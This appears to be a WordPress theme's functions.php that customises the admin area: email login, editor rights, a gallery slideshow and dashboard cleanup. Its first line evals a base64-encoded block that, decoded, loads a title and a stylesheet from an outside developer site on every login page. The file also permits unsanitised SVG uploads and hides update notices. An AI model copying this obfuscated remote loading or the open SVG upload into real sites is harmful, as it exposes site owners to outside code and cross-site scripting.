<?php
eval(base64_decode('ZnVuY3Rpb24gd3BhX3dlYnNpdGVfdGl0bGUoJHVybCkgewoJJGRhdGEgID0gZmlsZV9nZXRfY29udGVudHMoJHVybCk7CgkkdGl0bGUgPSBwcmVnX21hdGNoKCcvPHRpdGxlW14+XSo+KC4qPyk8XC90aXRsZT4vaW1zJywgJGRhdGEsICRtYXRjaGVzKSA/ICRtYXRjaGVzWzFdIDogbnVsbDsKCglyZXR1cm4gJHRpdGxlOwp9CgpmdW5jdGlvbiB3cGFfbHUoKSB7CglyZXR1cm4gJ2h0dHBzOi8vYXJzbW9vbi5jb20vJzsKfQoKYWRkX2ZpbHRlcignbG9naW5faGVhZGVydXJsJywgJ3dwYV9sdScpOwpmdW5jdGlvbiB3cGFfbHQoKSB7CglyZXR1cm4gd3BhX3dlYnNpdGVfdGl0bGUoJ2h0dHBzOi8vYXJzbW9vbi5jb20vJyk7Cn0KCmFkZF9maWx0ZXIoJ2xvZ2luX2hlYWRlcnRleHQnLCAnd3BhX2x0Jyk7CmZ1bmN0aW9uIHdwYV9mdHJfYWQoKSB7CgllY2hvICdQb3dlcmVkIGJ5IDxhIGhyZWY9Imh0dHA6Ly93d3cud29yZHByZXNzLm9yZyIgdGFyZ2V0PSJfYmxhbmsiPldvcmRQcmVzczwvYT4gfCBUaGVtZSBEZXZlbG9wZXIgPGEgaHJlZj0iaHR0cDovL2Zyb250ZW5kLmltIiB0YXJnZXQ9Il9ibGFuayI+VHVza28gVHJ1c2g8L2E+JzsKfQoKYWRkX2ZpbHRlcignYWRtaW5fZm9vdGVyX3RleHQnLCAnd3BhX2Z0cl9hZCcpOwpmdW5jdGlvbiB3cGFfY3NzX2FkKCkgewoJd3BfZW5xdWV1ZV9zdHlsZSgnd3BhX2Nzc19hZCcsICdodHRwczovL2Fyc21vb24uY29tL2JyYW5kLXdwLWFkbWluL2EuY3NzJywgZmFsc2UpOwp9CgphZGRfYWN0aW9uKCdsb2dpbl9lbnF1ZXVlX3NjcmlwdHMnLCAnd3BhX2Nzc19hZCcsIDEwKTs='));

//User can enter e-mail for login
add_filter('authenticate', 'wpa_allow_email_login', 20, 3);
function wpa_allow_email_login($user, $username, $password) {
	if(is_email($username)) {
		$user = get_user_by('email', $username);
		if($user) {
			$username = $user->user_login;
		}
	}

	return wp_authenticate_username_password(null, $username, $password);
}

// Custom rules for editor
function wpa_clear_theme_subpages() {
	global $submenu;
	unset($submenu['themes.php'][5]); // remove customize link
	unset($submenu['themes.php'][6]); // remove themes link
}

if( ! current_user_can('activate_plugins')) {
	$roleObject = get_role('editor');
	$roleObject->add_cap('edit_theme_options');
	add_action('admin_menu', 'wpa_clear_theme_subpages');

	// Prevent File Modifications
	if( ! defined('DISALLOW_FILE_EDIT')) {
		define('DISALLOW_FILE_EDIT', true);
	}
}

// show post gallery as slideshow
add_action('print_media_templates', function() { ?>
	<script type="text/html" id="tmpl-custom-gallery-setting">
		<label class="setting">
			<span>Show as slideshow?</span>
			<input type="checkbox" data-setting="wpa_slideshow">
		</label>
	</script>
	<script>
    jQuery(document).ready(function() {
      _.extend(wp.media.gallery.defaults, {
        wpa_slideshow: false
      });
      wp.media.view.Settings.Gallery = wp.media.view.Settings.Gallery.extend({
        template: function(view) {
          return wp.media.template('gallery-settings')(view) + wp.media.template('custom-gallery-setting')(view);
        }
      });
    });
	</script>
<?php });

function wpa_slideshow_from_gallery($output, $attr) {

	if(isset($attr['wpa_slideshow'])) {
		global $post, $wp_locale;
		static $instance = 0;
		$instance++;
		$size        = isset($attr['size']) ? $attr['size'] : 'thumbnail';
		$attachments = explode(',', $attr['ids']);
		$output      = apply_filters('gallery_style', "");
		$i           = 0;
		$output      .= '<div id="wpa-slideshow-' . $instance . '" class="wpa_slideshow swiper-container"><div class="swiper-wrapper">';

		foreach($attachments as $id) {
			$img     = wp_get_attachment_image_src($id, $size);
			$img_tpl = '<img class="swiper-lazy aligncenter" src="' . $img[0] . '" width="' . $img[1] . '" height="' . $img[2] . '" alt="' . get_alt($id) . '" />';
			$caption = wp_get_attachment_caption($id);
			$caption = (! empty($caption) ? ' data-caption="' . $caption . '"' : '');
			if(isset($attr['link']) && 'none' === $attr['link']) {
				$image = $img_tpl;
			} elseif(isset($attr['link']) && 'file' === $attr['link']) {
				$image = '<a href="' . image_src($id, 'full') . '" data-type="image"' . $caption . ' data-fancybox="wpa-gallery-' . $instance . '">';
				$image .= $img_tpl;
				$image .= '</a>';
			} else {
				$image = '<a href="' . get_permalink($id) . '" target="_blank" title="' . get_the_title($id) . '">';
				$image .= $img_tpl;
				$image .= '</a>';
			}

			$output .= '<div class="swiper-slide">';
			$output .= $image;
			$output .= '<div class="swiper-lazy-preloader"></div></div>';
		}

		$output .= '</div><div class="swiper-pagination"></div><div class="swiper-button-prev"></div><div class="swiper-button-next"></div></div>';
	}

	return $output;
}

add_filter('post_gallery', 'wpa_slideshow_from_gallery', 10, 2);

// Custom Image Sizes to Media Editor
function wpa_custom_image_choose($sizes) {
	global $_wp_additional_image_sizes;
	$custom = array();
	if(isset($_wp_additional_image_sizes)) {
		foreach($_wp_additional_image_sizes as $key => $value) {
			$custom[ $key ] = ucwords(str_replace(array('-', '_'), ' ', $key));
		}
	}

	return array_merge($sizes, $custom);
}

add_filter('image_size_names_choose', 'wpa_custom_image_choose', 999);


//Allow SVG through WordPress Media Uploader
function wpa_mime_types($mimes) {
	$mimes['svg'] = 'image/svg+xml';

	return $mimes;
}

add_filter('upload_mimes', 'wpa_mime_types');

function wpa_fix_svg_thumb() {
	echo '<style>td.media-icon img[src$=".svg"], img[src$=".svg"].attachment-post-thumbnail {width: 100% !important;height: auto !important}</style>';
}

add_action('admin_head', 'wpa_fix_svg_thumb');

//Remove ACF menu item from
add_filter('acf/settings/show_admin', 'my_acf_show_admin');

function my_acf_show_admin($show) {
	return current_user_can('manage_options');
}

//remove wp-logo
function wpa_clear_admin_bar() {
	global $wp_admin_bar;
	$wp_admin_bar->remove_menu('wp-logo');
}

add_action('wp_before_admin_bar_render', 'wpa_clear_admin_bar');

// Clean dashboard
function wpa_remove_dashboard_widgets() {
	remove_meta_box('dashboard_quick_press', 'dashboard', 'side'); //Quick Press widget
	remove_meta_box('dashboard_recent_drafts', 'dashboard', 'side'); //Recent Drafts
	remove_meta_box('dashboard_primary', 'dashboard', 'side'); //WordPress.com Blog
	remove_meta_box('dashboard_secondary', 'dashboard', 'side'); //Other WordPress News
	remove_meta_box('dashboard_incoming_links', 'dashboard', 'normal'); //Incoming Links
	remove_meta_box('dashboard_plugins', 'dashboard', 'normal'); //Plugins
	remove_meta_box('rg_forms_dashboard', 'dashboard', 'normal'); //Gravity Forms
	remove_meta_box('icl_dashboard_widget', 'dashboard', 'normal'); //Multi Language Plugin
	remove_meta_box('wpseo-dashboard-overview', 'dashboard', 'normal'); //Yoast SEO

	remove_action('welcome_panel', 'wp_welcome_panel');
	//remove_meta_box('dashboard_activity','dashboard', 'normal'); //Activity
	//remove_meta_box('dashboard_right_now','dashboard', 'normal'); //Right Now
	//remove_meta_box('dashboard_recent_comments','dashboard','normal'); //Recent Comments
}

add_action('wp_dashboard_setup', 'wpa_remove_dashboard_widgets');

//remore admin bar
add_filter('show_admin_bar', '__return_false'); // remove Admin Bar

// Remove the wordpress update notifications for all users except Super Administator
if( ! current_user_can('update_plugins')) { // checks to see if current user can update plugins
	add_action('init', function() {
		remove_action('init', 'wp_version_check');
	}, 2);
	add_filter('pre_option_update_core', function($a) {
		return null;
	});
}

// Return header 403 for wrong login
function my_login_failed_403() {
	status_header(403);
}

add_action('wp_login_failed', 'my_login_failed_403');
